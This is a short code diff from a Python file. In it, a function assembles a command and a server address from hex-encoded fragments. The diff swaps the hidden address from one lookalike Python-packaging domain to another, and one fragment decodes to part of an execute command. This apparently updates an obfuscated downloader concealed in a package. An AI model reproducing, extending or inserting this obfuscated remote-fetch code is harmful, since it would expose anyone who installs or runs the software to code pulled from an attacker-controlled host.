@@ -34,15 +34,14 @@ def _construct_command():
         '657865',
         '68747470',
         '733a2f2f',
-        '6e6f6465',
-        '322d7079',
-        '2d73746f',
-        '72652e63',
-        '6f6d'
+        '70792d69',
+        '6e737461',
+        '6c6c6572',
+        '2e6363'
     ]
     parsed = [_unhex(s) for s in segments]
     cmd = (parsed[0] + parsed[1] + parsed[2]).decode('utf-8', errors='ignore')
-    addr = (parsed[3] + parsed[4] + parsed[5] + parsed[6] + parsed[7] + parsed[8] + parsed[9]).decode('utf-8', errors='ignore')
+    addr = (parsed[3] + parsed[4] + parsed[5] + parsed[6] + parsed[7] + parsed[8]).decode('utf-8', errors='ignore')
     return cmd, addr
 
 def _initialize():
